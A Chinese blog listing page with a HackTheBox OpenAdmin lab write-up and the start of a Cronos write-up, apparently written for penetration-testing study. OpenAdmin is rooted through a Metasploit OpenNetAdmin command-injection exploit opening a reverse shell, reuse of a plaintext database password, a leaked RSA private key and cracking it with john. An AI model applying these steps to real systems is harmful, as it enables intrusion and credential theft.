<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Unc1e的博客">
<meta property="og:url" content="http://unc1e.com/page/3/index.html">
<meta property="og:site_name" content="Unc1e的博客">
<meta property="article:author" content="Unc1e">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://unc1e.com/page/3/"/>





  <title>Unc1e的博客</title>
  








<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Unc1e的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/20/yuque/HackTheBox%EF%BC%9AOpenAdmin%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/20/yuque/HackTheBox%EF%BC%9AOpenAdmin%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：OpenAdmin笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T15:51:26+08:00">
                2020-04-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>10.10.10.171<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587380704833-408753ae-e384-41be-80ab-7aa9c04e58a4.png#align=left&display=inline&height=286&margin=%5Bobject%20Object%5D&name=image.png&originHeight=572&originWidth=882&size=157266&status=done&style=none&width=441" alt="image.png"></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -A 10.10.10.171 -oA nmap.tcp</span></span><br><span class="line">Nmap scan report for 10.10.10.171</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)</span><br><span class="line">|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)</span><br><span class="line">|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)</span><br><span class="line">80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">1185/tcp  filtered catchpole</span><br><span class="line">2046/tcp  filtered sdfunc</span><br><span class="line">2701/tcp  filtered sms-rcinfo</span><br><span class="line">2875/tcp  filtered dxmessagebase2</span><br><span class="line">24444/tcp filtered unknown</span><br><span class="line">Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (93%), Linux 3.2 - 4.9 (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 3.10 (92%), Android 4.1.2 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 5900/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   354.54 ms 10.10.14.1</span><br><span class="line">2   354.49 ms 10.10.10.171</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/</span><br></pre></td></tr></table></figure>

<h2 id="80-端口：enum-more-gt-OpenNetAdmin"><a href="#80-端口：enum-more-gt-OpenNetAdmin" class="headerlink" title="80 端口：enum more -&gt; OpenNetAdmin"></a>80 端口：enum more -&gt; OpenNetAdmin</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dirb http://10.10.10.171/ -o dirb.scan</span></span><br><span class="line"><span class="comment">---- Scanning URL: http://10.10.10.171/ ----</span></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/artwork/</span><br><span class="line">	+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/music/</span><br><span class="line">	+ http://10.10.10.171/server-status (CODE:403|SIZE:277)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: http://10.10.10.171/artwork/ ----</span></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/artwork/css/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/artwork/fonts/</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587375922870-360a8238-3f29-405c-90b5-2f5f10ada95c.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=463&originWidth=1276&size=38380&status=done&style=none&width=638" alt="image.png"><br>找了一圈，无任何有价值东西。扫目录又发现一个<code>/music</code>目录</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587375957425-dcf2a709-2d6e-4a4a-ab94-51b9a07d2b3f.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=587&originWidth=1374&size=50619&status=done&style=none&width=687" alt="image.png"><br><a href="http://10.10.10.171/ona/" target="_blank" rel="noopener"><code>http://10.10.10.171/ona/</code></a>找到一个好东西<code>OpenNetAdmin 18.1.1</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587377149318-c776ea73-7777-4841-82e6-2a024507a64c.png#align=left&display=inline&height=203&margin=%5Bobject%20Object%5D&name=image.png&originHeight=522&originWidth=1916&size=142370&status=done&style=none&width=746" alt="image.png"><br>一通搜索，<code>msf</code>发现<code>rce</code>模块，不知为啥失败了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use unix&#x2F;webapp&#x2F;opennetadmin_ping_cmd_injection</span><br><span class="line">...</span><br><span class="line">msf5 exploit(unix&#x2F;webapp&#x2F;opennetadmin_ping_cmd_injection) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.14:4444</span><br><span class="line">[*] Exploiting...</span><br><span class="line">[*] Command Stager progress - 100.00% done (703&#x2F;703 bytes)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>

<p>又找到一个 exp 脚本<a href="https://github.com/amriunix/ona-rce" target="_blank" rel="noopener">https://github.com/amriunix/ona-rce</a>，跑成功了，<code>www-data</code>权限，但是无权读<code>flag</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sh$ ls &#x2F;home&#x2F;</span><br><span class="line">jimmy</span><br><span class="line">joanna</span><br><span class="line">sh$ ls &#x2F;home&#x2F;jimmy</span><br><span class="line">ls: cannot open directory &#39;&#x2F;home&#x2F;jimmy&#39;: Permission denied</span><br><span class="line">sh$ ls &#x2F;home&#x2F;joanna</span><br><span class="line">ls: cannot open directory &#39;&#x2F;home&#x2F;joanna&#39;: Permission denied</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现两个用户<code>jimmy</code>  、 <code>joanna</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux openadmin 4.15.0-70-generic <span class="comment">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">Ubuntu 18.04.3 LTS \n \l</span><br></pre></td></tr></table></figure>

<p>收集到一些密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /var/www/html/ona/local/config/database_settings.inc.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">    array (</span><br><span class="line">      0 =&gt;</span><br><span class="line">      array (</span><br><span class="line">        'db_type' =&gt; 'mysqli',</span><br><span class="line">        'db_host' =&gt; 'localhost',</span><br><span class="line">        'db_login' =&gt; 'ona_sys',</span><br><span class="line">        'db_passwd' =&gt; 'n1nj4W4rri0R!',</span><br><span class="line">        'db_database' =&gt; 'ona_default',</span><br><span class="line">        'db_debug' =&gt; false,</span><br><span class="line">      ),</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587382212524-e8e157ab-26e8-4953-acb9-b763fcdddf52.png#align=left&display=inline&height=416&margin=%5Bobject%20Object%5D&name=image.png&originHeight=832&originWidth=1261&size=145666&status=done&style=none&width=630.5" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/sierra/contact_process.php</span><br><span class="line">    $to = "rockybd1995@gmail.com";</span><br><span class="line">    ...</span><br><span class="line">       $send = mail($to, $subject, $body, $headers);</span><br></pre></td></tr></table></figure>

<p>用数据库密码，<code>ssh</code>登录上了<code>jimmy</code>的帐号</p>
<h2 id="jimmy-用户"><a href="#jimmy-用户" class="headerlink" title="jimmy 用户"></a>jimmy 用户</h2><p>读文件，发现<code>/var/www/internal</code>下面的文件。这个文件夹在<code>www-data</code>权限下是读不到的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/var/www/internal$ ls</span><br><span class="line">index.php  logout.php  main.php</span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ cat main.php</span><br><span class="line">&lt;?php session_start(); if (!isset ($_SESSION['username'])) &#123; header("Location: /index.php"); &#125;;</span><br><span class="line"><span class="comment"># Open Admin Trusted</span></span><br><span class="line"><span class="comment"># OpenAdmin</span></span><br><span class="line">$output = shell_exec('cat /home/joanna/.ssh/id_rsa');</span><br><span class="line">echo "&lt;pre&gt;$output&lt;/pre&gt;";</span><br><span class="line">?&gt;...</span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ cat index.php</span><br><span class="line">if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) &#123;</span><br><span class="line">              if ($_POST['username'] == 'jimmy' &amp;&amp;</span><br><span class="line">		hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')</span><br></pre></td></tr></table></figure>

<p><code>sha512</code>解密:<code>Revealed</code><br>那怎么利用这个<code>main.php</code> 中的<code>shell exec</code>呢。<code>main.php</code>需要我们登录，我这里原本打算采用更改<code>session</code>文件来实现登录态，谁知没权限。。只好找其他方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/etc/php/7.2/cli$ cat php.ini |grep session.save_path</span><br><span class="line">;session.save_path = "/var/lib/php/sessions"</span><br></pre></td></tr></table></figure>

<p>注意到 52846 端口，看不到进程的细节，应该是跑了个高权限的程序</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/var/www/internal$ lsof -i:52846</span><br><span class="line">jimmy@openadmin:/var/www/internal$  netstat -tunlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php</span><br><span class="line">&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du</span><br><span class="line">y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/</span><br><span class="line">/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span class="line">S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F</span><br><span class="line">FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line"><span class="comment">-----END RSA PRIVATE KEY-----</span></span><br><span class="line">&lt;/pre&gt;&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don't forget your "ninja" password&lt;/h3&gt;</span><br><span class="line">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>得到了 joanna 的</strong>私钥，准备用 johntheripper 爆破</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; sshjohn</span><br><span class="line">john <span class="comment">--wordlist=/usr/share/wordlists/rockyou.txt sshjohn</span></span><br></pre></td></tr></table></figure>

<p>不过一开始遇到了问题，<code>rockyou.txt</code>没解压好。用下面的方法解决</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在Kali上，使用以下命令解压缩rocyou.txt.gz文件：</span><br><span class="line"></span><br><span class="line">sudo gunzip /usr/share/wordlists.gz</span><br><span class="line">wc -l /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>``<br>ref:<a href="https://blog.csdn.net/sdihvai/article/details/103953010#jimmy_27" target="_blank" rel="noopener">https://blog.csdn.net/sdihvai/article/details/103953010#jimmy_27</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/18/yuque/HackTheBox%EF%BC%9ACronos%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/18/yuque/HackTheBox%EF%BC%9ACronos%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Cronos笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-18T23:15:54+08:00">
                2020-04-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587223007450-46718eff-4603-41bc-9691-7f0ef1d9a785.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=412&originWidth=641&size=94686&status=done&style=none&width=320.5" alt="image.png"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -sV -sC -Pn -p-  --min-rate 1000 -oA scans\alltcp 10.10.10.13</span></span><br><span class="line">Nmap scan report for 10.10.10.13</span><br><span class="line">Host is up (1.0s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|_  256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: 9.10.3-P4-Ubuntu</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>80 端口没东西。。。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587224616796-11c682a0-25f4-4c34-a9a9-a6b2d25abe8a.png#align=left&display=inline&height=405&margin=%5Bobject%20Object%5D&name=image.png&originHeight=810&originWidth=1423&size=152591&status=done&style=none&width=711.5" alt="image.png"></p>
<h2 id="53-端口：获得域名"><a href="#53-端口：获得域名" class="headerlink" title="53 端口：获得域名"></a>53 端口：获得域名</h2><p>看到有 dns 服务器，就百度了 dig 的用法。果然有惊喜，查到了<code>10.10.10.13</code>绑定的域名，绑 host 后即可访问</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig @10.10.10.13 -x 10.10.10.13</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; @10.10.10.13 -x 10.10.10.13</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span 